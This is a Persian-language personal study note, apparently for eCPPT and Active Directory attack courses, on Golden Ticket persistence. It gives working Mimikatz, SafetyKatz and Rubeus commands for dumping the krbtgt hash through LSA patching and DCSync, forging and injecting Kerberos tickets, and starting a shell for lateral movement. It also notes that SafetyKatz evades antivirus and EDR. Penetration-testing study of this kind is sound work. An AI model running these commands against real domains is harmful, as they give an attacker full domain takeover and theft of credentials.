
[[ECPPT/Active Directory/Golden Ticket|Golden Ticket]] ----> ECPPT
[[AD/Attacking Active Directory/Golden Ticket|Golden Ticket]]-----> Attacking Active Directory 

**پایداری – Golden Ticket**

- **Golden Ticket
- ** با **هش حساب krbtgt** امضا و رمزگذاری می‌شود که آن را به یک **TGT معتبر** تبدیل می‌کند.
    
- هش کاربر **krbtgt** می‌تواند برای **جعل هویت هر کاربر با هر سطح دسترسی** حتی از یک ماشین غیردامینی استفاده شود.
    
- به‌عنوان یک **اقدام امنیتی خوب**، توصیه می‌شود **رمز عبور حساب krbtgt دو بار تغییر کند**، زیرا **تاریخچه‌ی رمز عبور برای این حساب نگهداری می‌شود**.



---

### دستورات و مفهومشان برای گرفتن **krbtgt hash / Golden Ticket**

1. **اجرای Mimikatz روی Domain Controller با دسترسی Domain Admin**:
    

```powershell
Invoke-Mimikatz -Command "lsadump::lsa /patch" -ComputerName dcorp-dc
```

- هدف: گرفتن هش حساب **krbtgt** از **DC**
    
- نیازمند **دسترسی DA** است
    

2. **استفاده از قابلیت DCSync برای گرفتن کلیدهای AES حساب krbtgt**:
    

```text
C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"
```

- با این روش می‌توان **hash یا کلید AES krbtgt** را بدون اجرای کد روی DC دریافت کرد
    
- نیازمند **دسترسی DA یا کاربری با حق تکثیر روی اشیاء دامنه** است
    

---

### 🔹 نکته کلیدی برای جزوه:

- **DCSync** = گرفتن هش یا کلید krbtgt بدون نیاز به اجرای مستقیم کد روی DC
    
- **Mimikatz lsadump** = گرفتن مستقیم هش از حافظه یا LSA روی DC
    

> این دو روش اصلی برای آماده‌سازی **Golden Ticket** هستند.

---

### **afetyKatz.exe چیست؟**

- **SafetyKatz
- ** یک نسخه‌ی **کامپایل‌شده و امن‌تر از Mimikatz** است.
    
- کارش همانند Mimikatz است، یعنی:
    
    - استخراج **Credentialها** (مثل hashهای NTLM، Kerberos TGT)
        
    - استفاده از قابلیت‌هایی مثل **DCSync**، **Pass-the-Hash** و **Golden Ticket**
        
- دلیل اسم «Safety» این است که بعضی نسخه‌ها به گونه‌ای ساخته شده‌اند که:
    
    - کمتر توسط **آنتی‌ویروس یا EDR** شناسایی شوند
        
    - راحت‌تر در محیط‌های تست یا آزمایشی (lab) اجرا شوند
        
    - امکان اجرای دستورات Mimikatz بدون باز کردن پنجره یا تأثیر مستقیم روی


### 🔹 کاربرد رایج در محیط AD

1. گرفتن هش کاربر **krbtgt** برای ساخت **Golden Ticket**
    
2. استفاده از **DCSync** برای دریافت credentialهای دیگر کاربران بدون اجرای کد روی DC
    
3. تست و شبیه‌سازی حملات Kerberos در محیط آزمایشی




---

### **Replication Service در AD چیست؟**

- **Replication Service** 
- یک سرویس داخلی در **Active Directory** است که مسئول **همگام‌سازی داده‌ها بین Domain Controllerها** است.
    
- هر تغییر در یک DC (مثل ایجاد کاربر جدید، تغییر رمز عبور، تغییر Group Policy) باید **به همه DCهای دیگر در دامنه یا Forest منتقل شود**.
    
- این سرویس تضمین می‌کند که **تمام DCها اطلاعات یکسانی از دامنه داشته باشند**.
    

---

### 🔹 نقش Replication Service در حملات

- برخی ابزارها مثل **Mimikatz / SafetyKatz DCSync** از این سرویس سوءاستفاده می‌کنند:
    
    - **کاربر با دسترسی مناسب به replication** می‌تواند **Credentialهای هر کاربر در دامنه** را بدون اجرای مستقیم کد روی DC دریافت کند.
        
    - مثال: گرفتن هش **krbtgt** برای ساخت **Golden Ticket**
        

> به زبان ساده: اگر دسترسی replication داشته باشی، می‌توانی اطلاعات حساس AD را به‌صورت «کپی» بدون تماس مستقیم با حافظه DC استخراج کنی.

---

### 🔹 نکات کلیدی برای جزوه

1. Replication Service = سرویس همگام‌سازی داده‌های AD بین DCها
    
2. DCSync از طریق این سرویس کار می‌کند، بدون نیاز به اجرای Mimikatz روی DC
    
3. هر کاربر با **Replication Rights** می‌تواند داده‌های مهم مانند **hashها و TGTها** را استخراج کند
    

---


---

## 1️⃣ بررسی وضعیت Replication Service روی DC

### از طریق PowerShell:

```powershell
Get-Service NTDS
```

- سرویس **NTDS** همان **Active Directory Domain Services** است که Replication را مدیریت می‌کند.
    
- خروجی نشان می‌دهد که سرویس **Running** است یا نه.
    

---

### از طریق CMD:

```cmd
sc query ntds
```

- همین کار را انجام می‌دهد و وضعیت سرویس را نشان می‌دهد.
    

---

## 2️⃣ مشاهده وضعیت همگام‌سازی بین DCها

### با دستور PowerShell:

```powershell
Get-ADReplicationPartnerMetadata -Target <DCName>
```

- این دستور اطلاعاتی از **تمام DCهای همکار و آخرین زمان Replication** به تو می‌دهد.
    

```powershell
Get-ADReplicationFailure -Scope Site -Target <SiteName>
```

- اگر مشکلی در Replication باشد، این دستور خطاها را نشان می‌دهد.
    

---

## 3️⃣ تعامل با Replication Service

- برای تعامل مستقیم با Replication Service معمولاً از ابزار **repadmin** استفاده می‌شود.
    

```cmd
repadmin /showrepl
```

- نمایش وضعیت Replication برای هر DC
    

```cmd
repadmin /syncall /e /P /d
```

- اجباری کردن **همگام‌سازی فوری** بین DCها
    

---

## 4️⃣ نکته امنیتی و تست

- ابزارهایی مثل **Mimikatz DCSync** از Replication Service برای استخراج credentialها استفاده می‌کنند.
    
- اگر دسترسی **DA یا replication rights** داشته باشی، می‌توانی بدون اجرای کد روی DC داده‌ها را دریافت کنی.
    

---

💡 **جمع‌بندی برای جزوه:**

1. Replication Service = سرویس همگام‌سازی داده‌های AD بین DCها
    
2. PowerShell و repadmin = ابزارهای مشاهده و تعامل
    
3. دسترسی replication = مسیر بالقوه برای استخراج credentialها (DCSync)
    

---

## 1️⃣ `lsadump::lsa /patch`

- این دستور **LSA (Local Security Authority)** را **Patch می‌کند** تا بتواند **Credentialها** (مثل hashهای NTLM و Ticketهای Kerberos) را از حافظه استخراج کند.
    
- در واقع `/patch` باعث می‌شود که **فرآیند امنیتی Windows کمتر محدود شود** و Mimikatz بتواند **رمزهای ذخیره شده در LSA** را بخواند.
    
- کاربرد اصلی: **آماده‌سازی سیستم برای استخراج credentialها** بدون ایجاد تغییر دائمی.
    

---

## 2️⃣ `lsadump::lsa /inject`

- این دستور **کد Mimikatz را داخل LSA یا فرآیندهای امنیتی تزریق می‌کند**.
    
- هدف: **دسترسی مستقیم به حافظه‌ی LSA** و گرفتن credentialها در لحظه‌ی اجرا.
    
- تفاوت اصلی با `/patch` این است که `/inject` بیشتر **عملیاتی و مستقیم روی حافظه** است، در حالی که `/patch` سیستم را **برای خواندن بعدی آماده می‌کند**.


![[Pasted image 20250909010306.png]]


![[Pasted image 20250909010329.png]]
![[Pasted image 20250909010437.png]]




## نکات 

## در حمله Golden Ticket ما از SID دامین استفاده میکنیم 



```
Rubeus.exe golden /user:Administrator /domain:corp.local /sid:S-1-5-21-XXXXXXXXXX \
/aes256:0123456789ABCDEF... /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt
```


## بعد از اینکه ما دستوری که برای  golden Ticket استفاده میشود رو زدم نکته یی که وجود دارد این است که باید در همان سشن یعنی داخل همون mimikatz بیایم و یک پروسسی رو استارت کنیم تا بتونیم از تیکت استفاده کنیم 




اگر ما بیایم و تیکت هایی که داریم رو purge کنیم یعنی پاک کنیم با استفاده از دستور 

```
klsit purge 
```

و بیایم و کامند مربوط بهش رو دوبراه بزنیم میبینم که همچنان تیکتی نداریم 

اما نکته چیه ؟

![[Pasted image 20250918210234.png]]


![[Screenshot 2025-09-18 194720.png]]



## اولین نکته اینه که نباید از ارگومان krbtgt استفاده کنیم و بعدش مقدار هش مربوطه بهش رو بدیم مستقیم باید از الگوریتم استفاده کنیم  که اینجا الگوریتمش میشه rc4 


## دومین نکته اینه که باید بیایم از داخل خوده Mimikatz یک شل cmd استارت کنیم یعنی بعد از اینکه تیکت رو  ساختیم نوبت به این میرسد که بیایم و با استفاده از دستور process بیایم و یک cmd باز کنیم این کار باعث میشود که اون تیکت داخل  cmd که اجرا میکنیم لود شود و ما بتونیم به نوعی lateral بکنیم




## سومین نکته اینه که باید SID که میدیم SID دامین باشه با استفاده از دستور net::trsut میتونیم لیست SID ها رو بکشونیم بیرون 



پس کامند ها به این صورته 

```
privilege::debug
```

```
lsadump::dcsync /user:krbtgt 
```

```
kerberos::golden /user:Administrator /domain:amin.com /sid:<sid_==domain==> /ptt
```


به صورت دیفالت این دستور میتونه برای ما تیکت رو بسازه و بعدش بریم و ازش استفاده کنیم اما موارد دیگری رو هم میتونیم لحاظ کنیم که بالا ذکر شده مثلا تاریخ تیکت و یا یک اسم هم میتونیم براش بزاریم 

```
process::start cmd 
```

```
winrs
```



![[Pasted image 20250918211431.png]]
